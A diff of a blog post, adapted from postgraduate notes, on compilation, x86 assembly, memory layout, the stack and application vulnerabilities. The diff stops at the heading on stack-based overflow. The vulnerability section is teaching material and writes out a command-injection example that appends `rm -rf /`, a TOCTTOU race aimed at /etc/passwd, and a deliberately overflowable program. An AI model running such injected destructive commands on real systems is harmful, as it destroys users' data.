@@ -4,7 +4,7 @@
     Aug 27, 2022
 -->
 
-*This post is adapted from lecture notes taken during postgraduate studies at King's College London.*
+*This post is adapted from my own notes taken during postgraduate studies at King's College London.*
 
 ## <a name="1" class="anchor"></a> [1. Introduction](#1)
 
@@ -14,7 +14,7 @@ A computer program is a sequence of bits (0 or 1), and organized as 8-bit bytes,
 
 #### <a name="1.1.1" class="anchor"></a> [Compilation system](#1.1.1)
 
-The compilation system typically includes a preprocessor, compiler, assembler, and linker, and is used to translate programs into a sequence of machine-language instructions, which is packed into an executable object file. The compilation process (note that program code and file suffix refer to programs written in the C programming language and using [gcc](https://linux.die.net/man/1/gcc) to compile):
+The compilation system typically includes a preprocessor, compiler, assembler, and linker, and is used to translate programs into a sequence of machine-language instructions, which is packed into an executable object file. The compilation process (note that most program code and file suffix refer to programs written in the C programming language and using [gcc](https://linux.die.net/man/1/gcc) to compile):
 
 ```c
 /* hello.c */
@@ -30,26 +30,26 @@ int main() {
 
 2. compiler translates the intermediate file into an assembly program with `.s` suffix, where each line describe one instruction, use flag `-S` to generate assembly program (note that below assembly is generated on 64-bit macOS, operand size suffix and special directives for assembler is omitted for clarity)
 
-    ```x86asm
-    .section __TEXT
-        .globl  _main
-    
-    _main:
-        push    %rbp
-        mov     %rsp, %rbp
-        sub     $16, %rsp
-        mov     $0, -4(%rbp)
-        lea     L_.str(%rip), %rdi
-        mov     $0, %al
-        call    _printf
-        xor     %eax, %eax
-        add     $16, %rsp
-        pop     %rbp
-        ret
-    
-    .section __TEXT
-        L_.str: .asciz  "hello c\n"
-    ```
+```x86asm
+.section __TEXT
+    .globl  _main
+
+_main:
+    push    %rbp
+    mov     %rsp, %rbp
+    sub     $16, %rsp
+    mov     $0, -4(%rbp)
+    lea     L_.str(%rip), %rdi
+    mov     $0, %al
+    call    _printf
+    xor     %eax, %eax
+    add     $16, %rsp
+    pop     %rbp
+    ret
+
+.section __TEXT
+    L_.str: .asciz  "hello c\n"
+```
 
 3. assembler, such as [as](https://linux.die.net/man/1/as), translates assembly program instructions into machine-level instructions, use flag `-c` to compile assembly program, resulting in a relocatable object file with `.o` suffix (this is a binary file)
 
@@ -62,24 +62,12 @@ Linking is the process to resolve references to external objects, such as variab
 A few useful tools for working with programs:
 
 - [gdp](https://www.sourceware.org/gdb/), GNU debugger
-- `objdump`, such as `objdump -d <program>`, display information about object file (disassembler)
-
-    - `gcc hello.c && objdump -d hello`, alternative to `gcc -S` to see assembly
-        
-        ```x86asm
-        ; ...
-        push   %rbp
-        mov    %rsp, %rbp
-        sub    $16, %rsp
-        mov    $0, -4(%rbp)
-        lea    48(%rip), %rdi
-        ; ...
-        ```
-
-- `readelf`, display information about ELF files
-- `hexdump`, display content in binary file
-- `elfish`, manipulate ELF files
-- `/proc/pid/maps`, show memory layout for process
+- `objdump` such as `objdump -d <filename>` to display information about object file (disassembler)
+    -  `gcc hello.c && objdump -d hello` (alternative to `gcc -S` to see assembly)
+- `readelf` to display information about ELF files
+- `elfish` to manipulate ELF files
+- `hexdump` to display content in binary file
+- `/proc/pid/maps` to show memory layout for process
 
 ### <a name="1.2" class="anchor"></a> [1.2 Computer organisation](#1.2)
 
@@ -88,16 +76,16 @@ Most modern computers are organized as an assemble of buses, I/O devices, main m
 - buses are collections of electrical conduits that carry bytes between components, usually fixed sized and referred to as words, where the word size is 4 bytes (32 bits) or 8 bytes (64 bits)
 
 - I/O devices are connections to the external world, such as keyboard, mouse, and display, but also disk drives, which is where executable files are stored
-    - controller, chip sets in the devices themselves or main circuit board (also called motherboard)
-    - adapter, cards plugged into the motherboard
+    - controllers are chip sets in the devices themselves or main circuit board (motherboard)
+    - adapters are cards plugged into the motherboard
 
-- main memory is a temporary storage device that holds program and data when executed by the processor, physically, it is a collection of dynamic random-access memory (DRAM) chips, and logically, it is a linear array of bytes with its own unique address (also called array index)
+- main memory is a temporary storage device that holds program and data when executed by the processor, physically, it is a collection of dynamic random-access memory (DRAM) chips, and logically, it is a linear array of bytes with its own unique address (array index)
 
 - processor, or central processing unit (CPU), is the engine that interprets and executes the machine-level instructions stored in the main memory
 
 #### <a name="1.2.1" class="anchor"></a> [CPU](#1.2.1)
 
-The CPU has a word size storage device (register) called program counter (PC) that points at some instruction in main memory. Instructions are executed in a strict sequence, which is to read and interpret instruction as pointed to by program counter, perform operation (as per the instruction), and then update the counter to point to next instruction (note that each instruction has its own unique address). An operation, as performed by the CPU, use main memory, register file, which is a small storage device with collection of word-size registers, and the arithmetic logic unit (ALU) to compute new data and address values:
+The CPU has a word size storage device (register) called program counter (PC) that points at some instruction in main memory. Instructions are executed in a strict sequence, which is to read and interpret the instruction as pointed to by program counter, perform operation (as per the instruction), and then update the counter to point to next instruction (note that each instruction has its own unique address). An operation, as performed by the CPU, use main memory, register file, which is a small storage device with collection of word-size registers, and the arithmetic logic unit (ALU) to compute new data and address values:
 
 - load, copy byte (or word) from main memory into register, overwriting previous content in register
 
@@ -109,7 +97,7 @@ The CPU has a word size storage device (register) called program counter (PC) th
 
 ### <a name="1.3" class="anchor"></a> [1.3 Cache memory](#1.3)
 
-A cache memory is a memory device with different levels, or sizes (L1, L2, L3), where smaller sizes are faster (note that locality can be used to make programs run faster).
+A cache memory describe memory devices at different levels, or sizes (L1, L2, L3), where smaller sizes are faster (this locality can be exploited to make programs run faster).
 
 |    |     |     |
 | -- | :-- | :-- |
@@ -131,24 +119,24 @@ The operating system provides services to programs, which are used via abstracti
 - load executable file, such as `./hello` (command to execute program `hello`), which basically copies the code and data in file from disk to main memory
 - once loaded, the processor starts to execute the machine-language instructions in the `main` routine, which corresponds to the function `main` in program, copies the data from memory to register, and then from register to display device, which should output the string "hello assembly"
 
-A system command is a command-line program (note that `system()` is a library function to execute shell commands in C programs, for more system commands, see: [List of Unix commands](https://en.wikipedia.org/wiki/List_of_Unix_commands)):
+A system command is a command-line program (`system()` is a library function to execute shell commands in C programs, for more system commands, see: [List of Unix commands](https://en.wikipedia.org/wiki/List_of_Unix_commands)):
 
 - sort files with `ls | sort`
 
-    ```c
-    int main() {
-        system("ls | sort");
-        return 0;
-    }
-    ```
+```c
+int main() {
+    system("ls | sort");
+    return 0;
+}
+```
 
 - copy files with `cp`, such as `cp ~/file /dest` (note that `~` expands into `HOME` environment variable)
 
-Note that a system call is a function executed by the operating system, such as accessing hard drive and creating processes, whereas system command is a program implementing functions (system calls are used by programs to request services from the operating system). In C, and most other programming languages, system commands, such as `write`, is wrapped in some other function, such as `printf`.
+A system call is a function executed by the operating system, such as accessing hard drive and creating processes, whereas system command is a program implementing functions (system calls are used by programs to request services from the operating system). In C, and most other programming languages, system commands, such as `write`, is wrapped in some other function, such as `printf`.
 
 #### <a name="1.4.1" class="anchor"></a> [Process](#1.4.1)
 
-A process is an abstraction for processor, main memory, and I/O devices, and represent a running program, where its context is the state information the process needs to run. The processor can switch between multiple running programs, such as shell and program, using context switching, which saves the state of current process and restores state of some new process. A thread is multiple execution units within a process with access to the same code and global data, and kernel is collection of code and data structures that is always in memory. A kernel is used to manage all processes and called using a system call instruction, or `syscall`, which transfers control to the kernel when the program need some action by the operating system, such as read or write to file.
+A process is an abstraction for processor, main memory, and I/O devices, and represent a running program, where its context is the state information the process needs to run. The processor can switch between multiple running programs, such as shell and program, using context switching, which saves the state of current process and restores the state of some new process. A thread is multiple execution units within a process with access to the same code and global data, and kernel is collection of code and data structures that is always in memory. A kernel is used to manage all processes and called using a system call instruction, or `syscall`, which transfers control to the kernel when the program need some action by the operating system, such as read or write to file.
 
 #### <a name="1.4.2" class="anchor"></a> [Virtual memory](#1.4.2)
 
@@ -194,87 +182,73 @@ int main() {
 
 - locations in buffer (note that address space is based on Linux legacy VM layout)
 
-    |     |     |
-    | :-- | --- |
-    | | user space ~3GB |
-    | `.text` (program code) | ... |
-    | `.bss` (uninitialized global data) | `z` |
-    | `.data` (initialized global data) | `w` |
-    | heap (growing from lower to higher addresses) | `malloc(42)` |
-    | memory mapped region for large chunks of memory, such as shared libraries (text, data, `printf`) | ... |
-    | stack (growing from higher to lower addresses) | `x` |
-    | | `y`  |
-    | | `*p` |
-    | | `p` (points to address in heap) |
-    | | `*p = 42` (write 42 in address in heap) |
-    | | kernel space ~1GB |
+|     |     |
+| :-- | --- |
+| | user space ~3GB |
+| `.text` for program code | |
+| `.bss` for uninitialized global data | `z` |
+| `.data` for initialized global data | `w` |
+| heap (growing from lower to higher addresses) | `malloc(42)` |
+| memory mapped region for large chunks of memory, such as shared libraries (text, data, `printf`) | |
+| stack (growing from higher to lower addresses) | `x` |
+| | `y`  |
+| | `*p` |
+| | `p` (points to address in heap) |
+| | `*p = 42` (write 42 in address in heap) |
+| | kernel space ~1GB |
 
 ### <a name="2.3" class="anchor"></a> [2.3 Application-level vulnerabilities](#2.3)
 
-Vulnerabilities in applications is often due to deployment of overprivileged applications, such as mobile applications asking for all permissions or installed application is writable (instead of only readable), and implementation issues with unexpected inputs or errors:
+Vulnerabilities in applications are often due to deployment of overprivileged applications, such as mobile applications asking for all permissions or when applications are writable instead of only readable, and implementation issues with unexpected inputs or errors:
 
 - local attacks need an established presence on host, such as account or application controlled by attacker, would allow executing operations with superior privileges, and is easier to perform (better knowledge of environment)
 - remote attacks involve manipulation of an application via network-based interaction, unauthenticated, which means there is no need for authentication or permission, would allow executing operations with privileges of the vulnerable application, and is more difficult to perform (but more powerful, no need to require prior access to system).
 
 Most local attacks exploit vulnerabilities in SUID-root programs to obtain root privileges. Bad inputs can be supplied at startup via command line and environment, or during execution via dynamic-linked objects and files. Unintended interaction with environment can result in creation of new files, accessing files via file system, or invoking commands and processes. Local attacks often result in memory corruption (control hijacking, data brainwashing), command injection, and information leaks.
 
-#### <a name="2.3.1" class="anchor"></a> [Environment attack](#2.3.1)
+#### <a name="2.3.1" class="anchor"></a> [Environment attacks](#2.3.1)
 
 An environment attack can occur when applications invoke external commands to carry out tasks, such as `system()` to execute some command, `popen()` to open a process, or `execlp()` and `execvp()` to use the `PATH` environment variable to locate applications. A `PATH` substitution attack use commands without a complete path, where attacker modifies the `PATH` variable to run script, or the `HOME` variable to control execution of commands, such as accessing files.
 
-#### <a name="2.3.2" class="anchor"></a> [Input argument attack](#2.3.2)
+#### <a name="2.3.2" class="anchor"></a> [Input argument attacks](#2.3.2)
 
-An input argument attack can occur when applications are supplied arguments via the command-line (note that this could also apply to web applications and SQL), where user-provided inputs can be used to inject commands, such as `./program "; rm -rf /"`, which would call `program` and then inject command to delete everything, traverse directories (dot-dot attack), overflow buffer, and perform format string attack:
+An input argument attack can occur when applications are supplied arguments via the command-line (this also applies to web applications and databases), where user-provided inputs can be used to inject commands, such as `./program "; rm -rf /"`, which would call `program` and then inject command to delete everything, traverse directories (dot-dot attack), overflow buffer, and perform format string attacks:
 
-- always check size to avoid overflow, such as when copied into buffers
-    - `snprintf` restrict size to `n`
-    
-    <!--    
-    ```c
-    int main (int argc, char **argv) {
-        char cmd[1024];
+- always check size to avoid overflow, such as when copied into buffers (`snprintf` limits size to `n`)
 
-        snprintf(cmd, 1024, "cat /var/log/%s", argv[1]);
-        cmd[1023] = '\0';
+- always sanitize user-provided input to avoid bad formats, such as excluding known bad inputs, define allowed input, or escaping special characters
 
-        return system(cmd);
-    }
-    ```
-    -->
-
-- always sanitize user-provided input to avoid bad formats, such as by excluding known bad inputs, define allowed input, or escape special characters
-
-#### <a name="2.3.3" class="anchor"></a> [File access attack](#2.3.3)
+#### <a name="2.3.3" class="anchor"></a> [File access attacks](#2.3.3)
 
 A file access attack can occur when applications create and use files: 
 
 - always check that file exist (and is not symbolic link)
 
 - [race conditions](https://en.wikipedia.org/wiki/Race_condition), such as [time-of-check to time-of-use (TOCTTOU)](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use), can occur when there is conflicting access to shared data by multiple processes, where at least one has write access
+
+```c
+// `access()` checks real UID and `open()` checks effective UID
+
+/* real UID */
+if (access("file", W_OK) == 0) {
+    /* symlink("/etc/passwd", "file"); */
     
-    - `access()` checks real UID and `open()` checks effective UID
+    /* effective UID */
+    if((f = open("file", O_WRONLY)) < 0) {
+        /* ... */
+    }
+    /* potentially writing to "/etc/passwd" */
+    write(f, buffer, count);
+}
+```
 
-        ```c
-        /* real UID */
-        if (access("file", W_OK) == 0) {
-            /* symlink("/etc/passwd", "file"); */
-            
-            /* effective UID */
-            if((f = open("file", O_WRONLY)) < 0) {
-                /* ... */
-            }
-            /* potentially writing to "/etc/passwd" */
-            write(f, buffer, count);
-        }
-        ```
-
-#### <a name="2.3.4" class="anchor"></a> [Buffer overflow attack](#2.3.4)
+#### <a name="2.3.4" class="anchor"></a> [Buffer overflow attacks](#2.3.4)
 
 A buffer overflow attack can occur when programs try to store more elements in a buffer (set of memory locations) than it can contain. Systems can sometimes detect and block potential overflows, such as in Java, and others do not detect, in which case the operation is executed (it is not detected in C by default).
 
-#### <a name="2.3.5" class="anchor"></a> [**Example:** buffer overflow](#2.3.5)
+<!-- #### <a name="2.3.5" class="anchor"></a> [**Example:** buffer overflow](#2.3.5) -->
 
-Below is an example program vulnerable to the buffer overflow attack (note that executing this would result in overflow of `buffer_1` into `buffer_2`)
+An example program vulnerable to the buffer overflow attack (executing this would result in overflow of `buffer_1` into `buffer_2`):
     
 ```c
 int main() {
@@ -314,7 +288,7 @@ In most assembly-like languages, an instruction has the form `mnemonic <source>,
 
 - labels are symbol at current address, so `number: .byte 42` is same as `char number = 42;` in C (global variable)
 
-#### <a name="3.1.1" class="anchor"></a> [Register](#3.1.1)
+#### <a name="3.1.1" class="anchor"></a> [Registers](#3.1.1)
 
 A register is a memory location on the CPU and prefixed with `%`, such as general-purpose registers, including stack pointer `%esp`, frame pointer `%ebp`, instruction pointer `%eip`, and flags register (note that `%esp`, `%ebp`, and `%eip` is 32 bit, and `%rsp`, `%rbp`, and `%rip` is equivalent 64 bit):
 
@@ -327,187 +301,26 @@ A register is a memory location on the CPU and prefixed with `%`, such as genera
 - second byte
     - `%ah` `%bh` `%ch` `%dh`
 
-A constant is prefixed with `$` and the operand size is specified as suffix to mnemonic, so byte is `b` (8 bit), word is `w` (16 bit), and long is `l` (32-bit or 64-bit floating point). Memory is accessed by dereferencing pointers, where dereferencing is specified as `displacement(base, index, scale)` (AT&T) and `displacement + base + index * scale` (Intel), where `base` and `index` are 32-bit general purpose registers, `displacement` is a 32-bit constant or symbol (default is 0), and `scale` is 1, 2, 4, or 8 (default is 1).
+A constant is prefixed with `$` and the operand size is specified as suffix to mnemonic, so byte is `b` (8 bit), word is `w` (16 bit), and long is `l` (32-bit or 64-bit floating point). An initial layout (bits 0-15 is `%ax` and 0-31 is extended, `%eax`) and final layout after `mov $1, %eax`, copy 1 and set rest to zero:
 
-#### <a name="3.1.2" class="anchor"></a> [**Example**: memory location layout](#3.1.2)
+|     |      |      |      |
+| --- | ---  | ---  | ---  |
+| `%a1` | `%ah` |
+| 0 | 8 | 16 | 31 |
 
-- initial layout (note that bits 0-15 is `%ax` and 0-31 is extended, `%eax`)
+|     |     |     |     |
+| --- | ---  | ---  | ---  |
+| `%a1` | `%ah` |
+| 10000000 | 00000000 | 0 – 0 | 0 – 0 |
+| 0 | 8 | 16 | 31 |
 
-    |     |      |      |      |
-    | --- | ---  | ---  | ---  |
-    | `%a1` | `%ah` |
-    | 0 | 8 | 16 | 31 |
-
-
-- `mov $1, %eax`, copy 1 and set rest to zero
-
-    |     |     |     |     |
-    | --- | ---  | ---  | ---  |
-    | `%a1` | `%ah` |
-    | 10000000 | 00000000 | 0 ... 0 | 0 ... 0 |
-    | 0 | 8 | 16 | 31 |
+In most programming languages, memory is accessed using pointers, which are variables that store memory addresses. Dereferencing a pointer means accessing the value stored at the memory address pointed to by the pointer. In order to dereference a pointer, the memory address must be computed based on the contents of the base and index registers, and an optional constant displacement and scaling factor scale. The exact syntax for dereferencing a pointer depends on the architecture and instruction set used by the processor.
 
 ### <a name="3.2" class="anchor"></a> [3.2 Assembly programming](#3.2)
 
-Assembly programs are typically generated by compilers, but it can sometimes be necessary to inspect or change manually (note that writing programs using assembly instructions is not very efficient and can be very error prone).
+Assembly programs are typically generated by compilers, but it can sometimes be necessary to inspect or change manually (writing programs using only assembly instructions is not very efficient and can be very error prone).
 
-#### <a name="3.2.1" class="anchor"></a> [Data transfer](#3.2.1)
-
-- set destination as source
-
-    ```x86asm
-    mov <source>, <destination>
-    ```
-
-- swap destinations
-
-    ```x86asm
-    xchg <destination>, <destination>
-    ```
-
-- store source on top of stack
-
-    ```x86asm
-    push <source>
-    ```
-
-- get destination from top of stack
-
-    ```x86asm
-    pop <destination>
-    ```
-
-#### <a name="3.2.2" class="anchor"></a> [Binary arithmetic](#3.2.2)
-
-- addition, `destination += source`
-
-    ```x86asm
-    add <source>, <destination>
-    ```
-
-- subtraction, `destination -= source`
-
-    ```x86asm
-    sub <source>, <destination>
-    ```
-
-- increment, `destination += 1`
-
-    ```x86asm
-    inc <destination>
-    ```
-
-- decrement, `destination -= 1`
-
-    ```x86asm
-    dec <destination>
-    ```
-
-- negation, `destination = -destination`
-
-    ```x86asm
-    neg <destination>
-    ```
-
-#### <a name="3.2.3" class="anchor"></a> [Logical operators](#3.2.3)
-    
-- and, `destination &= source`
-
-    ```x86asm
-    and <source>, <destination>
-    ```
-
-- or, `destination |= source`
-
-    ```x86asm
-    or <source>, <destination>
-    ```
-
-- exclusive or, `destination ^= source`
-
-    ```x86asm
-    xor <source>, <destination>
-    ```
-
-- not, `destination = ~destination`
-
-    ```x86asm
-    not <destination>
-    ```
-
-#### <a name="3.2.4" class="anchor"></a> [Unconditional branches](#3.2.4)
-
-- jump to address
-
-    ```x86asm
-    jmp <address>
-    ```
-
-- push return address and call function at address
-
-    ```x86asm
-    call <address>
-    ```
-
-- pop return address and return
-
-    ```x86asm
-    ret
-    ```
-
-- call OS-defined handler represented by const
-
-    ```x86asm
-    int <const>
-    ```
-
-#### <a name="3.2.5" class="anchor"></a> [Conditional branches](#3.2.5)
-
-- jump below (unsigned), `%eax < %ebx` (note that `label` is location)
-
-    ```x86asm
-    cmp %ebx, %eax
-    jb <label>
-    ```
-
-- jump not less (signed), `%eax >= %ebx`
-
-    ```x86asm
-    cmp %ebx, %eax
-    jnl <label>
-    ```
-
-- jump zero, `%eax = 0`
-
-    ```x86asm
-    test %eax, %eax
-    jz <label>
-    ```
-
-- jump not signed, or not below (signed), `%eax >= 0`
-
-    ```x86asm
-    cmp $0, %eax
-    jns <label>
-    ```
-
-#### <a name="3.2.6" class="anchor"></a> [Other instructions](#3.2.6)
-
-- load effective address (source must be in memory), `destination = &source`
-
-    ```x86asm
-    lea <source>, <destination>
-    ```
-
-- do nothing
-
-    ```x86asm
-    nop
-    ```
-
-#### <a name="3.2.7" class="anchor"></a> [**Example**: assembly program](#3.2.7)
-
-Below is an example assembly program, which should output "hello assembly" (note that it is easier to experiment with assembly programs in emulators, such as [nasm Online Compiler](https://rextester.com/l/nasm_online_compiler)).
+Below is an assembly program to output "hello assembly" (it is often easier to explore assembly programs in emulators, such as [nasm Online Compiler](https://rextester.com/l/nasm_online_compiler)) or [Compiler Explorer](https://godbolt.org/).
 
 ```x86asm
 ; assembly program (64-bit, intel syntax)
@@ -529,61 +342,194 @@ section .data
     msg db "hello assembly", 10
 ```
 
+#### <a name="3.2.1" class="anchor"></a> [Data transfer](#3.2.1)
+
+```x86asm
+; set destination as source
+mov <source>, <destination>
+```
+
+```x86asm
+; swap destinations
+xchg <destination>, <destination>
+```
+
+```x86asm
+; store source on top of stack
+push <source>
+```
+
+```x86asm
+; get destination from top of stack
+pop <destination>
+```
+
+#### <a name="3.2.2" class="anchor"></a> [Binary arithmetic](#3.2.2)
+
+```x86asm
+; addition, destination += source
+add <source>, <destination>
+```
+
+```x86asm
+; subtraction, destination -= source
+sub <source>, <destination>
+```
+
+```x86asm
+; increment, destination += 1
+inc <destination>
+```
+
+```x86asm
+; decrement, destination -= 1
+dec <destination>
+```
+
+```x86asm
+; negation, destination = -destination
+neg <destination>
+```
+
+#### <a name="3.2.3" class="anchor"></a> [Logical operators](#3.2.3)
+
+```x86asm
+; and, destination &= source
+and <source>, <destination>
+```
+
+```x86asm
+; or, destination |= source
+or <source>, <destination>
+```
+
+```x86asm
+; exclusive or, destination ^= source
+xor <source>, <destination>
+```
+
+```x86asm
+; not, destination = ~destination
+not <destination>
+```
+
+#### <a name="3.2.4" class="anchor"></a> [Unconditional branches](#3.2.4)
+
+```x86asm
+; jump to address
+jmp <address>
+```
+
+```x86asm
+; push return address and call function at address
+call <address>
+```
+
+```x86asm
+; pop return address and return
+ret
+```
+
+```x86asm
+; call OS-defined handler represented by const
+int <const>
+```
+
+#### <a name="3.2.5" class="anchor"></a> [Conditional branches](#3.2.5)
+
+```x86asm
+; jump below (unsigned), %eax < %ebx (label is location)
+cmp %ebx, %eax
+jb <label>
+```
+
+```x86asm
+; jump not less (signed), %eax >= %ebx
+cmp %ebx, %eax
+jnl <label>
+```
+
+```x86asm
+; jump zero, %eax = 0
+test %eax, %eax
+jz <label>
+```
+
+```x86asm
+; jump not signed, or not below (signed), %eax >= 0
+cmp $0, %eax
+jns <label>
+```
+
+#### <a name="3.2.6" class="anchor"></a> [Other instructions](#3.2.6)
+
+```x86asm
+; load effective address (source must be in memory), destination = &source
+lea <source>, <destination>
+```
+
+```x86asm
+; do nothing
+nop
+```
+
 ## <a name="4" class="anchor"></a> [4. The stack](#4)
 
 ### <a name="4.1" class="anchor"></a> [4.1 Stack layout](#4.1)
 
 A stack grows towards lower memory addresses, and the stack pointer, `%esp`, points to top of stack, which is the lowest valid address and last pushed to stack.
 
-#### <a name="4.1.1" class="anchor"></a> [**Example**: stack operation](#4.1.1)
+<!-- #### <a name="4.1.1" class="anchor"></a> [**Example**: stack operation](#4.1.1) -->
 
-Below is an example stack operation using `push` and `pop`:
+A stack operation using `push` and `pop`:
 
 - initial layout
 
-    |        |   |              |
-    | -------| - | :------------|
-    |        | a | `0xbfff8000` |
-    |        | b | `0xbfff7ffc` |
-    |        | c | `0xbfff7ff8` |
-    |        | d | `0xbfff7ff4` |
-    | `%esp` | e | `0xbfff7ff0` |
-    |        |   | `0xbfff7fec` |
-    |        |   | `0xbfff7fe8` |
+|        |   |              |
+| -------| - | :------------|
+|        | a | `0xbfff8000` |
+|        | b | `0xbfff7ffc` |
+|        | c | `0xbfff7ff8` |
+|        | d | `0xbfff7ff4` |
+| `%esp` | e | `0xbfff7ff0` |
+|        |   | `0xbfff7fec` |
+|        |   | `0xbfff7fe8` |
 
 - `push f` to increment pointer, create space, and store `f` at address
 
-    |        |   |              |
-    | ------ | - | :------------|
-    |        | a | `0xbfff8000` |
-    |        | b | `0xbfff7ffc` |
-    |        | c | `0xbfff7ff8` |
-    |        | d | `0xbfff7ff4` |
-    |        | e | `0xbfff7ff0` |
-    | `%esp` | f | `0xbfff7fec` |
-    |        |   | `0xbfff7fe8` |
+|        |   |              |
+| ------ | - | :------------|
+|        | a | `0xbfff8000` |
+|        | b | `0xbfff7ffc` |
+|        | c | `0xbfff7ff8` |
+|        | d | `0xbfff7ff4` |
+|        | e | `0xbfff7ff0` |
+| `%esp` | f | `0xbfff7fec` |
+|        |   | `0xbfff7fe8` |
 
 - `pop %eax` to decrement pointer and store value in `%eax` (note that `f` is still at `0xbfff7fec` but will be overwritten on next `push`)
 
-    |        |   |              |
-    | ------ | - | :----------- |
-    |        | a | `0xbfff8000` |
-    |        | b | `0xbfff7ffc` |
-    |        | c | `0xbfff7ff8` |
-    |        | d | `0xbfff7ff4` |
-    | `%esp` | e | `0xbfff7ff0` |
-    |        | f | `0xbfff7fec` |
-    |        |   | `0xbfff7fe8` |
+|        |   |              |
+| ------ | - | :----------- |
+|        | a | `0xbfff8000` |
+|        | b | `0xbfff7ffc` |
+|        | c | `0xbfff7ff8` |
+|        | d | `0xbfff7ff4` |
+| `%esp` | e | `0xbfff7ff0` |
+|        | f | `0xbfff7fec` |
+|        |   | `0xbfff7fe8` |
 
-    |        |   |
-    | ------ | - |
-    | `%eax` | f |
+|        |   |
+| ------ | - |
+| `%eax` | f |
 
 ### <a name="4.2" class="anchor"></a> [4.2 Stack frames](#4.2)
 
-A stack is composed of frames, which are pushed to the stack because of function calls, and address to current frame is stored in the frame pointer register, `%ebp`. Each frame contain function parameters, which are pushed to stack by caller, return address to jump to at the end, pointer to previous frame (save `%ebp` to stack and set `%ebp = %esp`, frame pointer is lowest valid address and part of prologue), and local variables, which are part of the prologue executed by caller (note that address location is subtracted to move towards lower addresses, typically 4 bytes). The epilogue is executed by the callee to deallocate local variables, `%esp = %ebp`, save result in some register, such as `%eax`, restore frame pointer of caller function, and then resume execution from saved return address.
+A stack is composed of frames, which are pushed to the stack from function calls, and address to current frame is stored in the frame pointer register, `%ebp`. Each frame contain function parameters, which are pushed to stack by caller, return address to jump to at the end, pointer to previous frame (save `%ebp` to stack and set `%ebp = %esp`, frame pointer is lowest valid address and part of prologue), and local variables, which are part of the prologue executed by caller (address location is subtracted to move towards lower addresses, typically 4 bytes).
 
-#### <a name="4.2.1" class="anchor"></a> [**Example**: function call and stack layout](#4.2.1)
+The epilogue is executed by the callee to deallocate local variables, `%esp = %ebp`, save result in some register, such as `%eax`, restore frame pointer of caller function, and then resume execution from saved return address.
+
+#### <a name="4.2.1" class="anchor"></a> [Function calls and stack layout](#4.2.1)
 
 Below is an example function call and resulting stack layout:
 
@@ -592,7 +538,6 @@ int convert(char *str) {
     int result = atoi(str);
     return result;
 }
-
 int main(int argc, char **argv) {
     int sum, i;
     for (i=0; i < argc; i++) {
@@ -605,33 +550,33 @@ int main(int argc, char **argv) {
 
 - pushed by main caller
 
-    |        |              |
-    | ------ | :----------- |
-    | `argv` | `0xbfff8000` |
-    | `argc` | `0xbfff7ffc` |
-    | return address (from main) | `0xbfff7ff8` |
+|        |              |
+| ------ | :----------- |
+| `argv` | `0xbfff8000` |
+| `argc` | `0xbfff7ffc` |
+| return address (from main) | `0xbfff7ff8` |
 
 - pushed by `main`
 
-    |     |      |
-    | --- | :--- |
-    | frame pointer (before main) | `0xbfff7ff4` |
-    | `sum` | `0xbfff7ff0` |
-    | `i` | `0xbfff7fec` |
-    | `str` | `0xbfff7fe8` |
-    | return address (from convert to main) | `0xbfff7fe4` |
+|     |      |
+| --- | :--- |
+| frame pointer (before main) | `0xbfff7ff4` |
+| `sum` | `0xbfff7ff0` |
+| `i` | `0xbfff7fec` |
+| `str` | `0xbfff7fe8` |
+| return address (from convert to main) | `0xbfff7fe4` |
 
 - pushed by `convert`
 
-    |     |      |
-    | --- | :--- |
-    | frame pointer (before convert) | `0xbfff7fe0` |
-    | `result` | `0xbfff7fdc` |
-    | paramater to `atoi` | `0xbfff7fd8` |
+|     |      |
+| --- | :--- |
+| frame pointer (before convert) | `0xbfff7fe0` |
+| `result` | `0xbfff7fdc` |
+| paramater to `atoi` | `0xbfff7fd8` |
 
-#### <a name="4.2.2" class="anchor"></a> [**Example**: function call in assembly](#4.2.2)
+#### <a name="4.2.2" class="anchor"></a> [Function calls in assembly](#4.2.2)
 
-Below is an example function call and termination (note that the below assembly can be generated with [Compiler Explorer](https://godbolt.org/) using `x86-64 gcc 4.1.2` and flag `-m32` for 32-bit, AT&T syntax):
+Below is an example function call and termination. This assembly code can be generated with [Compiler Explorer](https://godbolt.org/) using `x86-64 gcc 4.1.2` and flag `-m32` for 32-bit, AT&T syntax):
 
 ```c
 #include <stdio.h>
@@ -639,99 +584,98 @@ Below is an example function call and termination (note that the below assembly 
 void func(int n) {
     printf("argument: %d;\n", n);
 }
-
 int main(int argc, char **argv) {
     func(10);
     return 0;
 }
 ```
 
-- assembly instructions for `func` (note that `leave` is same as `mov %ebp, %esp` followed by `pop %ebp`, operand size suffix is omitted for clarity)
+- assembly instructions for `func` (`leave` is same as `mov %ebp, %esp` followed by `pop %ebp`, operand size suffix is omitted for clarity)
     
-    ```x86asm
-    .LCO
-        .string "argument: %d;\n"
-    ```
+```x86asm
+.LCO
+    .string "argument: %d;\n"
+```
 
-    ```x86asm
-    func:
-        ; void func(int n) {
-        push    %ebp
-        mov     %esp, %ebp
-        sub     $8, %esp
-        ; printf("argument: %d;\n", n);
-        mov     8(%ebp), %eax
-        mov     %eax, 4(%esp)
-        mov     $.LCO, (%esp)
-        call    printf
-        ; }
-        leave
-        ret
-    ```
+```x86asm
+func:
+    ; void func(int n) {
+    push    %ebp
+    mov     %esp, %ebp
+    sub     $8, %esp
+    ; printf("argument: %d;\n", n);
+    mov     8(%ebp), %eax
+    mov     %eax, 4(%esp)
+    mov     $.LCO, (%esp)
+    call    printf
+    ; }
+    leave
+    ret
+```
 
 - assembly instructions for `main`
 
-    ```x86asm
-    main:
-        ; int main(int argc, char **argv) {
-        lea     4(%esp), %ecx
-        and     $-16, %esp
-        push    -4(%ecx)
-        push    %ebp
-        mov     %esp, %ebp
-        push    %ecx
-        sub     $4, %esp
-        ; func(10);
-        mov     $10, (%esp)
-        call    func
-        ; return 0;
-        mov     $0, %eax
-        ; }
-        add     $4, %esp
-        pop     %ecx
-        leave
-        lea     -4(%ecx), %esp
-        ret
-    ```
+```x86asm
+main:
+    ; int main(int argc, char **argv) {
+    lea     4(%esp), %ecx
+    and     $-16, %esp
+    push    -4(%ecx)
+    push    %ebp
+    mov     %esp, %ebp
+    push    %ecx
+    sub     $4, %esp
+    ; func(10);
+    mov     $10, (%esp)
+    call    func
+    ; return 0;
+    mov     $0, %eax
+    ; }
+    add     $4, %esp
+    pop     %ecx
+    leave
+    lea     -4(%ecx), %esp
+    ret
+```
 
 ### <a name="4.3" class="anchor"></a> [4.3 Stack-based overflow](#4.3)
 
